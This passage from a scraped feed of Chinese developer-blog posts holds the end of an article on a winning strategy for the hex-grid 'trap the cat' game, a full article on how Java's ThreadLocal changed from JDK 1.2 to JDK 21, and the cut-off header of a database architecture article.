<li><strong>天使</strong>：定义正整数k为天使的<strong>阶数</strong>，k阶天使每步可以跳到k*k范围内的任何一格，无论路上有没有障碍物。</li>
<li><strong>恶魔</strong>：每一轮中，恶魔可以在棋盘上放置一个障碍物，但不可放在当前天使所在的位置。</li>
<li><strong>胜负</strong>：
<ul>
<li>若在一轮中，天使无法移动，则<strong>恶魔获胜</strong>。</li>
<li>如果天使能无限地继续游戏，则<strong>天使获胜</strong>。</li>
</ul>
</li>
</ul>
<p>康威已经证明（虽然他说是该书的共同作者伯利坎普展示给他的），只要棋盘大小大于32*33，k=1的情况下恶魔是必胜的。</p>
<p>为方便展示，这里将格点化为方格。如图2所示是一个33*33的棋盘，天使起始位于红色方格。无论天使开局怎么走，恶魔前8步只需将棋盘四周的8个黑格填上障碍物，这时天使必然位于中间的蓝色区域内，距离接触包围圈还有7步。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e127c1aa3e14800b0b33c4200a5ef70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=nNErLXb8nngKVGjdUFYjxR%2F19n0%3D" alt="image.png" loading="lazy"/></p>
<p>而无论天使向哪个方向逃，恶魔都可以隔一格放一个障碍物这样逐渐缩小缺口，保证在天使接触棋盘边缘之前将缺口堵上，因此恶魔是必胜的。</p>
<h3 data-id="heading-5">回到围小猫</h3>
<p>一阶的天使问题告诉我们，只要棋盘足够大，让我们可以提前布置好包围圈，就一定能围住天使。而且天使问题中的棋盘是<strong>八连通</strong>的，即天使向横竖斜八个方向都可以移动，所以布置一个包围圈至少需要八步。而围小猫中的棋盘是<strong>六连通</strong>的，因此包围圈只需要6步。</p>
<p>我们定义<strong>猫猫从空白棋盘中心逃脱的最少步数为棋盘的深度n</strong>，可以看到，围小猫游戏的棋盘深度为5。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fae7ede7e26740388e006f99eea8d394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=PyQoqXub0pokR%2BPDZ5sFYih9R7I%3D" alt="image.png" loading="lazy"/>
丰富的游戏经验告诉我，n=5显然是不够的。如果要保证必胜，像天使问题里一样布置一个包围圈至少需要6个障碍物，也就是6步。因为猫n步就会逃出棋盘，而我们必须在猫逃脱之前花至少一步堵住逃脱的方向，所以棋盘的深度n至少应该为6+1+1=8。</p>
<p>那么棋盘需要有多大才能保证必胜呢？答案就是<strong>n=8</strong>。图中偶数号格点为我方放的障碍物，奇数号格点依次为猫猫的行动轨迹，可以看到这种情况下，我方是必定获胜的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31f9c308eef741b6ada10e7d52125285~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=9uwMqLRD9PuNalIxJ4%2Byhl70rps%3D" alt="image.png" loading="lazy"/></p>
<p>所以，<strong>只要棋盘的深度不小于8，即使是一个空白的棋盘，我们也是必定可以围住小猫的。</strong> 相应地，在没有障碍物的情况下，棋盘深度小于8时我们是不可能围住小猫的。</p>
<h3 data-id="heading-6">那么，有障碍物呢？</h3>
<p>终于回到了我们最初的问题：<strong>如何在一个n=5的棋盘上利用已有的障碍物围住猫猫。</strong></p>
<p>其实这里的思路还是一样的，那就是：先用若干步布置一个包围圈，然后通过围堵来完善包围圈。唯一的不同是，由于棋盘不够大，我们必须利用已有的障碍物来布置包围圈。和棋盘的深度一样，我们定义<strong>包围圈的深度为猫猫逃出包围圈的最少步数</strong>。很显然，包围圈越深，留给我们布置防线的步数就越多。</p>
<p>先来研究一下包围圈应该是什么样子的：</p>
<ul>
<li>包围圈应当是<strong>六边形</strong>，与棋盘形状相同。</li>
<li>每条边都<strong>必须经过每个经过格点的圆心</strong>，不允许斜着直接连。</li>
<li>只有包围圈的<strong>每个顶点</strong>（如下面图6中的1-6号点）或者<strong>与该顶点相邻且在包围圈上的格点</strong>（如下图6中的7-15号点）有障碍物，才能起到挡住猫猫的效果。如果上述位置没有障碍物的话，就无法保证在猫猫被追赶到此处时闭合包围圈。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d09e8af6011b4b119ccf62883bf5cba2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=JOK236hgmRgUmBs3BPJZs54B2Eg%3D" alt="image.png" loading="lazy"/></p>
<p>如果一个顶点或与其相邻且在包围圈上的格点上有障碍物，我们就称这个顶点<strong>已完成</strong>，定义一个<strong>包围圈的完成度为已完成的顶点数量</strong>。下面我们举一个例子来说明。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec958e4073ee411098b78f7bd63b384c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=83Q0LPntbRJWr3FART%2FDFmikozI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/734496a7e84d4208bb2c939f161cb2da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=%2ByXb1a4rcbk6%2FrgCQddumcVvEYk%3D" alt="image.png" loading="lazy"/>
图6是一个包围圈的雏形，可以看到1，2，11，4，5号点都有障碍物，他们对应的顶点都已完成。但它并不是一个完整的包围圈，因为顶点6是未完成的。如果猫猫从右上往左上逃，我们堵住8号点后猫猫会逃至16号点，此时6，7两点均空，猫猫逃脱。顶点5虽然有障碍物，但它本身也是一个顶点，不能算作顶点6的相邻点。所以这个包围圈的完成度是5。</p>
<p>从棋盘深度为8的情形我们可以知道，在包围圈完成，即完成度为6时，如果猫猫距离包围圈至少有2格，我们根据猫猫的位置放障碍物来围堵就可以必胜。也就是说，<strong>必胜条件是包围圈深度 + 包围圈完成度至少为8</strong>。</p>
<p>所幸，上图中的猫猫距离包围圈有3格，也就是说包围圈的深度是3，如下图所示，我们只需补上包围圈里缺失的点，就可以保证必胜。这就是看过本文的我们，第一步落在看似不需要优先围堵的6号点的原因。</p>
<p>需要注意的是，<strong>画包围圈也是有技巧的</strong>。比如下面这个图8就有AB两种画圈的方式，且包围圈的完成度均为5。</p>
<ul>
<li>如果按照<strong>红色的A方案</strong>规划4，5号点之间的包围圈，则包围圈的深度为2，5+2&lt;8，无法围住猫猫。</li>
<li>如果按照<strong>蓝色的方案B</strong>，则包围圈的深度为3，5+3=8，可以围住猫猫。</li>
</ul>
<p>所以画圈的方式也是很重要的哦！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c253ad1207f44269b9d87554e1898ed1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=LyA3Cx6A0sxctaAGCGbjAfcPqC8%3D" alt="image.png" loading="lazy"/></p>
<p>然而，由于游戏条件的限制，初始只有6-8个障碍物，棋盘深度也只有5，所以大多数情况下都是无法必胜的，如果想围住小猫，就多多地刷新吧！</p>
<p>不过，实际上游戏里的这只小猫并不太聪明，它的逃脱逻辑只是一个<strong>单层的贪心算法</strong>：只考虑当前看来是最好的逃脱路线。所以我们可以利用这点设下陷阱，诱导猫猫走出多余的步数，从而赢下无法必胜的棋盘，有兴趣的读者朋友一定要去试一试哦。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b8da92d294b4d5497ad26d245eb7d5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2S6Z2S5a2Q6KG_5oKg5oKg5oiR5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490897&amp;x-signature=ioO5GPCWelHSQpxc5iKQUWAyz3s%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">围住猫猫的秘诀！</h3>
<p>最后，让我们总结一下围住猫猫的秘诀吧！只需要简单的三步哦。</p>
<ol>
<li><strong>第一步</strong>：根据已有的初始障碍物划定包围圈，在保证有尽可能多顶点被完成的前提下，让包围圈的深度尽可能地大。</li>
<li><strong>第二步</strong>：判断<strong>包围圈完成度 + 包围圈的深度</strong>是否<strong>≥8</strong>？如果小于则无法保证围住猫猫，直接重置。</li>
<li><strong>第三步</strong>：先将包围圈完成，然后对应猫猫所在位置进行围堵即可获胜。</li>
</ol>
<h3 data-id="heading-8">写在最后</h3>
<p>还记得开头说的天使问题吗？这个问题其实并没有被完全解决。目前在天使的阶数k比较小，比如k=2的时候，数学家已经证明天使在无限大棋盘上是必胜的，但是对于任意有限阶的天使，哪方能必胜这个问题尚无答案。</p>
<p>也许，能够解决这个问题的就是聪明的你。</p>
<p><strong>解决不了也没关系，至少，你学会如何抓住猫猫了，对吧？</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 JDK1.2 到 JDK21：ThreadLocal的进化解决了什么问题]]></title>    <link>https://juejin.cn/post/7575367791272804390</link>    <guid>https://juejin.cn/post/7575367791272804390</guid>    <pubDate>2025-11-23T09:55:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575367791272804390" data-draft-id="7575182522411335718" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 JDK1.2 到 JDK21：ThreadLocal的进化解决了什么问题"/> <meta itemprop="keywords" content="后端,Java,面试"/> <meta itemprop="datePublished" content="2025-11-23T09:55:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一只叫煤球的猫"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 JDK1.2 到 JDK21：ThreadLocal的进化解决了什么问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一只叫煤球的猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T09:55:30.000Z" title="Sun Nov 23 2025 09:55:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. JDK 1.2：ThreadLocal 初版（最小可用）</h2>
<p><strong>核心特点：</strong></p>
<ul>
<li><code>ThreadLocal</code> 首次出现。</li>
<li>每个线程维护自己的 <code>ThreadLocalMap</code>。</li>
<li><code>ThreadLocalMap</code> 的 key 就是 <code>ThreadLocal</code> 本身。</li>
<li>底层使用开放地址法的哈希表（<code>Entry[] table</code>）。</li>
<li><strong>key 不是弱引用</strong>，导致 ThreadLocal 对象不释放时可能造成内存泄漏。</li>
</ul>
<p><strong>主要问题：</strong></p>
<ul>
<li>ThreadLocal 实例如果被 GC 回收前未手动 <code>remove()</code>，线程（尤其是线程池）不会结束，Entry 永远存在，导致 value 泄漏。</li>
</ul>
<p>这也是行业里常说的 ThreadLocal 泄漏最初来源。</p>
<hr/>
<h2 data-id="heading-1">2. JDK 1.3 ~ 1.4：Bug 修复 + 行为稳定</h2>
<p><strong>关键改动：</strong></p>
<ul>
<li>增强清理机制，但依然是 key 强引用。</li>
<li>修复部分扩容和冲突处理问题。</li>
</ul>
<p>但根本性的泄漏问题仍然存在。</p>
<hr/>
<h2 data-id="heading-2">3. JDK 5：引入弱引用（关键里程碑）</h2>
<p>这是 ThreadLocal 设计史上最重要的变更。</p>
<p><strong>重大更新：</strong></p>
<ul>
<li>
<p><code>ThreadLocalMap.Entry</code> 改为 <strong>弱引用</strong>：</p>
<pre><code class="hljs language-scala" lang="scala">static <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Entry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WeakReference&lt;ThreadLocal&lt;?&gt;&gt;</span> </span>{
    <span class="hljs-type">Object</span> value;
}
</code></pre>
</li>
<li>
<p>一旦 ThreadLocal 对象不再被外部引用，可以被 GC 回收，Entry 的 key 会变成 <code>null</code>。</p>
</li>
</ul>
<p><strong>为什么改成弱引用？</strong></p>
<ul>
<li>防止 ThreadLocal 对象不释放导致整组 Entry 无法被清理。</li>
</ul>
<p><strong>带来的副作用：</strong></p>
<ul>
<li>value 仍然是强引用，只要线程活着，value 永远不会被回收。</li>
<li>如果你不手动 <code>remove()</code>，依旧可能内存泄漏（尤其线程池）。</li>
</ul>
<p>至此，ThreadLocal 的内存泄漏问题变成了：</p>
<ul>
<li><strong>不是 key 泄漏，而是 value 泄漏。</strong></li>
</ul>
<hr/>
<h2 data-id="heading-3">4. JDK 6：清理机制增强 + TAB 数组 rehash 改善</h2>
<p><strong>JDK6 的重要演进：</strong></p>
<ul>
<li>加强对 key 为 <code>null</code> 的 Entry 的清理逻辑（例如访问冲突位点时主动清理）。</li>
<li>优化 rehash 和探测机制。</li>
</ul>
<p>整体结构仍为开放地址法，不改变本质机制。</p>
<hr/>
<h2 data-id="heading-4">5. JDK 7：性能优化 + 部分线程局部缓存行为改进</h2>
<p>JDK7 的变化偏向实现层。</p>
<p><strong>增强点：</strong></p>
<ul>
<li>完善冲突探测，降低哈希冲突导致的退化。</li>
<li>改善 nextIndex/prevIndex 的性能。</li>
<li>修复扩容后 rehash 的一些 bug。</li>
</ul>
<p>ThreadLocalMap 变得更健壮，但不改变语义。</p>
<hr/>
<h2 data-id="heading-5">6. JDK 8：清理策略进一步加强，核心逻辑成熟稳定</h2>
<p><strong>关键变化：</strong></p>
<ul>
<li>
<p>ThreadLocalMap 清理 <code>stale entry</code>（key = null）的策略更加激进：</p>
<ul>
<li>get/set/remove 时都会尝试清理死 key。</li>
</ul>
</li>
<li>
<p>内部 rehash 策略更高效。</p>
</li>
<li>
<p>线程池场景下的内存泄漏仍然需要手动处理 (<code>remove()</code>)，但 default 逻辑更健壮。</p>
</li>
</ul>
<p><strong>JDK8 的 ThreadLocal 基本成为行业主流参考实现。</strong></p>
<hr/>
<h2 data-id="heading-6">7. JDK 9：新增 <code>ThreadLocal.withInitial()</code>（语法糖）</h2>
<p>此版本以后属于稳定期，新增功能而非机制变化。</p>
<p><strong>新增：</strong></p>
<pre><code class="hljs language-scss" lang="scss">ThreadLocal<span class="hljs-selector-class">.withInitial</span>(() -&gt; new <span class="hljs-built_in">SimpleDateFormat</span>("yyyy-MM-dd"))
</code></pre>
<p>机制不变，易用性提升。</p>
<hr/>
<h2 data-id="heading-7">8. JDK 11 / JDK 17：几乎无变化，属于稳定维护期</h2>
<ul>
<li>持续做小修复，增强可读性与边界处理。</li>
<li>内存清理策略与 JDK8 几乎无差别。</li>
<li>语义和行为已经非常稳定。</li>
</ul>
<hr/>
<h2 data-id="heading-8">9. JDK 21：虚拟线程（Loom）下的 ThreadLocal 语义扩展（重要）</h2>
<p>在 Loom（虚拟线程）中：</p>
<p><strong>ThreadLocal 默认机制仍然可用，但成本更低：</strong></p>
<ul>
<li>虚拟线程是轻量结构，保留自己的 ThreadLocalMap。</li>
<li>虚拟线程不复用，生命周期短，因此不容易产生 ThreadLocal value 泄漏。</li>
</ul>
<p><strong>关键点：</strong></p>
<ul>
<li>虚拟线程不是池化线程，不会出现线程池泄漏问题。</li>
<li>某些场景 ThreadLocal 成本反而比传统线程更轻。</li>
</ul>
<hr/>
<h2 data-id="heading-9">10. 前后机制的核心变化总结</h2>


















































<table><thead><tr><th>JDK 版本</th><th>变化点</th><th>影响</th></tr></thead><tbody><tr><td>1.2</td><td>基本实现</td><td>存在严重泄漏风险</td></tr><tr><td>1.3-1.4</td><td>Bug 修复</td><td>稳定性增强</td></tr><tr><td>5</td><td><strong>key 改为弱引用</strong></td><td>避免 key 泄漏，但 value 泄漏依旧</td></tr><tr><td>6</td><td>加强化清理逻辑</td><td>降低内存泄漏风险</td></tr><tr><td>7</td><td>进一步优化冲突处理</td><td>性能提升</td></tr><tr><td>8</td><td><strong>成熟实现，清理更激进</strong></td><td>标准实现，被行业普遍使用</td></tr><tr><td>9+</td><td>易用性提升（withInitial）</td><td>开发体验增强</td></tr><tr><td>21</td><td>虚拟线程支持稳定</td><td>泄漏风险显著降低</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">11. 哪些问题贯穿所有版本？</h2>
<p>无论哪个版本，ThreadLocal 永远有两个核心风险：</p>
<ol>
<li><strong>value 会泄漏，只要线程还活着</strong></li>
<li><strong>线程池复用导致 value 长期驻留</strong></li>
</ol>
<p>这两个问题在 JDK21 的虚拟线程中弱化但未彻底消失。</p>
<hr/>
<h2 data-id="heading-11">12. 业内最佳实践</h2>
<ol>
<li>创建后必须手动 <code>remove()</code></li>
<li>避免在容器/框架级别缓存业务值</li>
<li>避免使用无界线程池结合 ThreadLocal</li>
<li>不要把 ThreadLocal 当成上下文传递机制（应使用 ThreadLocal 设计的框架）</li>
<li>推荐使用 <code>withInitial()</code> 避免 null 值</li>
</ol>
<hr/>
<h2 data-id="heading-12">13. 讲清楚本质</h2>
<p><strong>ThreadLocal 在整个 JDK 生命周期中的核心变化只有一次：JDK5 引入弱引用。</strong></p>
<p>其余版本改动都是：</p>
<ul>
<li>更激进的清理策略</li>
<li>更健壮的哈希探测与 rehash</li>
<li>更易用的 API</li>
<li>虚拟线程场景下的运行时表现改善</li>
</ul>
<p>但行为本质没有改变：</p>
<ul>
<li>每个线程维护一个 Map</li>
<li>key 弱引用</li>
<li>value 强引用</li>
<li>需要手动 remove，线程池中更应当如此</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从海量时序数据到无人值守：数据库在新能源集控系统中的架构实践]]></title>    <link>https://juejin.cn/post/7575442779038761002</link>    <guid>https://juejin.cn/post/7575442779038761002</guid>    <pubDate>2025-11-23T08:22:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575442779038761002" data-draft-id="7575442779038744618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从海量时序数据到无人值守：数据库在新能源集控系统中的架构实践"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2025-11-23T08:22:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="倔强的石头_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从海量时序数据到无人值守：数据库在新能源集控系统中的架构实践
